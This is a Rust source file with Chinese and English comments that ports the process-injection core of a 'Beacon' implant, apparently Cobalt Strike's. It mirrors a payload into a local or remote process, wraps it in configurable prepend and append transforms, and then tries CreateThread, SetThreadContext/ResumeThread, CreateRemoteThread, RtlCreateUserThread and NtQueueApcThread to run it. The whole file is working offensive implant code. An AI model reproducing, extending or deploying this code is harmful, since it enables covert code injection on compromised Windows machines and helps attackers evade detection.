//! 移植自 src/inject.cpp —— Beacon 进程注入逻辑的主干（inject_process_execute、
//! __inject_process_logic、populate_inject_context、inject_process_logic）。
//! Port of src/inject.cpp — the master tree for Beacon's process injection
//! logic (inject_process_execute, __inject_process_logic,
//! populate_inject_context, inject_process_logic).
//!
//! 本模块拥有 `InjectContext` 结构体以及 PI_EXEC_* / INJECT_ARCH_* 常量，
//! 并从兄弟模块 inject_*.rs 重新导出每一种注入技术，使 `crate::inject::*`
//! 成为唯一入口点（C++ 把这些分散在 inject.cpp + inject_*.cpp 中）。
//! This module owns the `InjectContext` struct and the PI_EXEC_* /
//! INJECT_ARCH_* constants, and re-exports every injection technique from
//! the sibling inject_*.rs modules so `crate::inject::*` is the single
//! entry point (the C++ spread these across inject.cpp + inject_*.cpp).

use crate::bformat::bformat_init;
use crate::callback::post_error_dd;
use crate::elevate::is_x64;
use crate::parse::DataP;
use crate::settings::setting_ptr;
use std::ffi::c_void;
use windows_sys::Win32::Foundation::GetLastError;
use windows_sys::Win32::System::Threading::{GetCurrentProcessId, PROCESS_INFORMATION};

pub use crate::inject_apcthread::{inject_via_apcthread, inject_via_apcthread_targeted};
pub use crate::inject_createthread::{inject_via_createthread, inject_via_remotethread};
pub use crate::inject_hinted::inject_with_hinted_func;
pub use crate::inject_mirror::{finalize_memory_permissions, local_mirror_data, remote_mirror_data};
pub use crate::inject_rtlcreateuserthread::inject_via_createuserthread;
pub use crate::inject_rtlcreateuserthread_wow64::inject_via_remotethread_wow64;
pub use crate::inject_setthreadcontext::inject_via_resumethread;
pub use crate::inject_smart::setup_smart_inject;

use crate::beacon::{
    SETTING_PROCINJ_EXECUTE, SETTING_PROCINJ_TRANSFORM_X64, SETTING_PROCINJ_TRANSFORM_X86,
};

/// 来自 inject.h 的 PI_EXEC_* 技术代码。
/// PI_EXEC_* technique codes from inject.h.
pub const PI_EXEC_FAIL: u32 = 0x0;
pub const PI_EXEC_CREATETHREAD: u32 = 0x1;
pub const PI_EXEC_SETTHREADCONTEXT: u32 = 0x2;
pub const PI_EXEC_CREATEREMOTETHREAD: u32 = 0x3;
pub const PI_EXEC_RTLCREATEUSERTHREAD: u32 = 0x4;
pub const PI_EXEC_NTQUEUEAPCTHREAD: u32 = 0x5;
pub const PI_EXEC_CREATETHREAD_F: u32 = 0x6;
pub const PI_EXEC_CREATEREMOTETHREAD_F: u32 = 0x7;
pub const PI_EXEC_NTQUEUEAPCTHREAD_S: u32 = 0x8;

/// 来自 inject.h 的目标/当前架构代码。
/// Target/current architecture codes from inject.h.
pub const INJECT_ARCH_X86: u8 = 0;
pub const INJECT_ARCH_X64: u8 = 1;

/// 进程注入上下文（INJECTCONTEXT）。
/// Process injection context (INJECTCONTEXT).
#[derive(Clone)]
pub struct InjectContext {
    pub h_process: isize,
    pub h_thread: isize,
    pub pid: u32,
    pub target_arch: u8,
    pub my_arch: u8,
    pub same_arch: bool,
    pub same_pid: bool,
    pub is_suspended: bool,
}

/// 遍历进程注入的 execute 选项并逐个尝试每种技术（inject_process_execute）。
/// `ptr` 指向已镜像的数据，`offset` 是要调用函数在其中的位置。
/// Walk the process inject execute options and try each technique
/// (inject_process_execute). `ptr` points at the mirrored data and `offset`
/// is the location of the function to call inside of it.
fn inject_process_execute(context: &mut InjectContext, ptr: *mut u8, offset: i32, parameter: *mut c_void) -> bool {
    // 128 是该字段的固定大小。
    /* 128 is the FIXED size of this field */
    let mut options = [0u8; 128];
    if let Some(opts) = setting_ptr(SETTING_PROCINJ_EXECUTE) {
        let n = opts.len().min(128);
        options[..n].copy_from_slice(&opts[..n]);
    }
    let mut parser = DataP::init(&mut options);

    // 起始地址在 C switch 的每个调用点都是相同的。
    // The start address is the same at every call site in the C switch.
    let start = unsafe { ptr.offset(offset as isize) } as *mut c_void;

    // 遍历我们的选项。
    /* walk our options */
    loop {
        let opcode = parser.data_byte();

        match opcode {
            // 自动失败，因为我们已经到达选项列表的末尾。
            /* automatic failure, because we're at the end of our options */
            PI_EXEC_FAIL => return false,

            // 尝试使用 CreateThread（仅适用于当前进程注入）。
            /* try to use CreateThread (works current process inject only */
            PI_EXEC_CREATETHREAD => {
                if context.same_pid && inject_via_createthread(context.h_process, context.pid, start, parameter) {
                    return true;
                }
            }

            // 尝试使用 SetThreadContext/ResumeThread 来执行我们的代码。
            /* try to use SetThreadContext/ResumeThread to execute our stuff */
            PI_EXEC_SETTHREADCONTEXT => {
                if context.is_suspended && inject_via_resumethread(context, start, parameter) {
                    return true;
                }
            }

            // 尝试使用 CreateRemoteThread（Rust 移植版面向 x64，即 _M_X64 分支）。
            /* try to use CreateRemoteThread (the Rust port targets x64, the _M_X64 branch) */
            PI_EXEC_CREATEREMOTETHREAD => {
                if inject_via_remotethread(context.h_process, start, parameter) {
                    return true;
                }
            }

            // 尝试使用 RtlCreateUserThread（Rust 移植版面向 x64，即 _M_X64 分支）。
            /* try to use RtlCreateUserThread (the Rust port targets x64, the _M_X64 branch) */
            PI_EXEC_RTLCREATEUSERTHREAD => {
                if inject_via_createuserthread(context.h_process, start, parameter) {
                    return true;
                }
            }

            // 尝试对未挂起的远程进程使用 NtQueueApcThread。
            /* try NtQueueApcThread against a remote process that is not suspended */
            PI_EXEC_NTQUEUEAPCTHREAD => {
                if !(context.same_pid || !context.same_arch || context.is_suspended)
                    && inject_via_apcthread(context, start, parameter)
                {
                    return true;
                }
            }

            // 带提示的 CreateThread。
            /* CreateThread with hint */
            PI_EXEC_CREATETHREAD_F => {
                let funcoff = parser.data_short();
                // 从解析器中拷贝出来：切片不是 NUL 结尾的，
                // 我们需要拥有它们才能传给 GetModuleHandleA/GetProcAddress。
                // Copy out of the parser: the slices are not NUL terminated
                // and we need them owned to pass to GetModuleHandleA/GetProcAddress.
                let module = parser.data_string_asciiz().unwrap_or(&[]).to_vec();
                let function = parser.data_string_asciiz().unwrap_or(&[]).to_vec();

                if context.same_pid
                    && inject_with_hinted_func(opcode, context.h_process, start, parameter, &module, &function, funcoff as u32)
                {
                    return true;
                }
            }

            // 带提示的 CreateRemoteThread。
            /* CreateRemoteThread with hint */
            PI_EXEC_CREATEREMOTETHREAD_F => {
                let funcoff = parser.data_short();
                let module = parser.data_string_asciiz().unwrap_or(&[]).to_vec();
                let function = parser.data_string_asciiz().unwrap_or(&[]).to_vec();

                if context.same_arch
                    && inject_with_hinted_func(opcode, context.h_process, start, parameter, &module, &function, funcoff as u32)
                {
                    return true;
                }
            }

            // 尝试对挂起的进程使用 NtQueueApcThread。
            /* try NtQueueApcThread against a suspended process */
            PI_EXEC_NTQUEUEAPCTHREAD_S => {
                if context.is_suspended
                    && context.same_arch
                    && inject_via_apcthread_targeted(context, start, parameter)
                {
                    return true;
                }
            }

            _ => {}
        }
    }
}

/// 将数据镜像到目标进程中，然后对其运行 execute 选项（__inject_process_logic）。
/// Mirror the data into the target process, then run the execute options
/// against it (__inject_process_logic).
fn __inject_process_logic(context: &mut InjectContext, buffer: &[u8], length: usize, offset: i32, parameter: *mut c_void) {
    // 镜像数据。
    /* mirror the data */
    let ptr = if context.same_pid {
        local_mirror_data(buffer, length)
    } else {
        remote_mirror_data(context, buffer, length)
    };

    if ptr.is_null() {
        return;
    }

    // 调用我们的逻辑来执行代码。
    /* call our logic to execute code */
    if inject_process_execute(context, ptr, offset, parameter) {
        return; /* TODO: the allocated memory is lost as well as the thread handle. */
    }

    // 上报错误：staging PI 失败……但不是 0x20。
    /* post an error staging PI failed... not 0x20 though */
    post_error_dd(0x48, context.pid as i32, unsafe { GetLastError() } as i32);
}

/// 填充一个注入上下文对象（populate_inject_context）。之所以存在，
/// 是因为注入代码中有几处都在反复推算这些相同的问题，
/// 而且有时做法还不一样。
/// Populate an inject context object (populate_inject_context). Exists
/// because several places in the inject code figure out these same questions
/// (again and again), sometimes with different ways of doing it.
fn populate_inject_context(context: &mut InjectContext, pi: *mut PROCESS_INFORMATION, h_process: isize, pid: u32) {
    context.h_process = h_process;
    context.pid = pid;
    context.my_arch = if is_x64() { INJECT_ARCH_X64 } else { INJECT_ARCH_X86 };
    context.target_arch = if is_x64_process(h_process) { INJECT_ARCH_X64 } else { INJECT_ARCH_X86 };
    context.same_arch = context.target_arch == context.my_arch;
    context.same_pid = pid == unsafe { GetCurrentProcessId() };

    if !pi.is_null() {
        unsafe {
            context.is_suspended = true;
            context.h_thread = (*pi).hThread as isize;
        }
    } else {
        context.is_suspended = false;
        context.h_thread = 0;
    }
}

/// 检查进程是否为 x64（委托给 crate::ps）。
/// Check if a process is x64 or not (delegates to crate::ps).
pub fn is_x64_process(process: isize) -> bool {
    crate::ps::is_x64_process(process)
}

/// 在缓冲区上应用我们的转换（inject_process_logic）。
///
/// `pi` 是已生成进程的 PROCESS_INFORMATION；当这不是适合 hollowing 技术
/// 的已生成进程时为 NULL。`buffer` 是要注入的数据（假定位于远程进程的
/// RX 页中）；它*始终*会被镜像，因此页权限和缓冲区可用性的假设成立。
/// `offset` 是要调用函数在镜像数据中的位置；`parameter`/`plen` 是
/// 要作为参数传入的远程数据块（已镜像）。
/// Handle our transforms on buffer (inject_process_logic).
///
/// `pi` is the PROCESS_INFORMATION of a spawned process, or NULL when this
/// is not a spawned process eligible for hollowing techniques. `buffer` is
/// the data to inject (assumed to live in RX pages in the remote process);
/// it *will* always be mirrored so page-permission and buffer-availability
/// assumptions hold. `offset` is the location of the function to call inside
/// the mirrored data; `parameter`/`plen` is a remote data blob (already
/// mirrored) to pass as the parameter.
pub fn inject_process_logic(
    pi: *mut c_void,
    h_process: isize,
    pid: u32,
    buffer: &[u8],
    length: usize,
    offset: i32,
    parameter: *mut c_void,
    plen: usize,
) {
    // 防止调用方传入比切片更大的长度；C 代码在这种情况下会越界读取。
    // 合法的调用方始终传入 length == len。
    // Guard against callers that pass a length larger than the slice; the C
    // code would read out of bounds. Valid callers always pass length == len.
    let length = length.min(buffer.len());

    let mut context = InjectContext {
        h_process: 0,
        h_thread: 0,
        pid: 0,
        target_arch: 0,
        my_arch: 0,
        same_arch: false,
        same_pid: false,
        is_suspended: false,
    };

    // 填充我们的上下文，避免其他函数再去推算同样的内容。
    /* populate our context to avoid the need for other functions to figure out the same crap */
    populate_inject_context(&mut context, pi as *mut PROCESS_INFORMATION, h_process, pid);

    // 如果我们是 smart inject DLL，则对其采取行动。
    /* if we're a smart inject DLL, act on it */
    setup_smart_inject(&mut context, buffer, length);

    // 弄清楚我们要应用哪个转换。
    /* figure out which transform we want to apply */
    let field = if context.target_arch == INJECT_ARCH_X64 {
        SETTING_PROCINJ_TRANSFORM_X64
    } else {
        SETTING_PROCINJ_TRANSFORM_X86
    };

    // 好的，让我们获取这些值（256 是该字段的固定大小）。
    /* alrighty, let's get these values (256 is the FIXED size of this field) */
    let mut transform = [0u8; 256];
    if let Some(t) = setting_ptr(field) {
        let n = t.len().min(256);
        transform[..n].copy_from_slice(&t[..n]);
    }
    let mut parser = DataP::init(&mut transform);
    let prependl = parser.data_int() as usize;
    // 从解析器中拷贝出来，以便同时保留 prepend/append。
    // Copy out of the parser so we can keep both prepend/append around.
    let prepend = parser.data_ptr(prependl).unwrap_or(&[]).to_vec();
    let appendl = parser.data_int() as usize;
    let append = parser.data_ptr(appendl).unwrap_or(&[]).to_vec();

    // 处理将参数复制到远程进程的事宜。
    /* handle copying our parameter to the remote process, please */
    let rparameter: *mut u8 = if plen > 0 {
        let pslice = unsafe { std::slice::from_raw_parts(parameter as *const u8, plen) };
        remote_mirror_data(&mut context, pslice, plen)
    } else {
        std::ptr::null_mut()
    };

    // 最简单的情况，什么都不用做。按需传递数据。
    /* easiest case, nothing needs to happen. Pass the data on as needed */
    if prependl == 0 && appendl == 0 {
        __inject_process_logic(&mut context, &buffer[..length], length, offset, rparameter as *mut c_void);
        return;
    }

    // 好的，让我们建立 builder 并让它跑起来。
    /* okie, let's setup our builder and get this moving */
    let mut tbuffer = bformat_init(appendl + prependl + length + 16);
    tbuffer.bformat_copy(&prepend);
    tbuffer.bformat_copy(&buffer[..length]);
    tbuffer.bformat_copy(&append);
    let offset = offset + prependl as i32;

    // 启动我们的进程注入调用。
    /* kick off our process inject call */
    __inject_process_logic(&mut context, tbuffer.bformat_string(), tbuffer.bformat_length(), offset, rparameter as *mut c_void);

    // 释放所有内容。
    /* free everything */
    tbuffer.free();
}
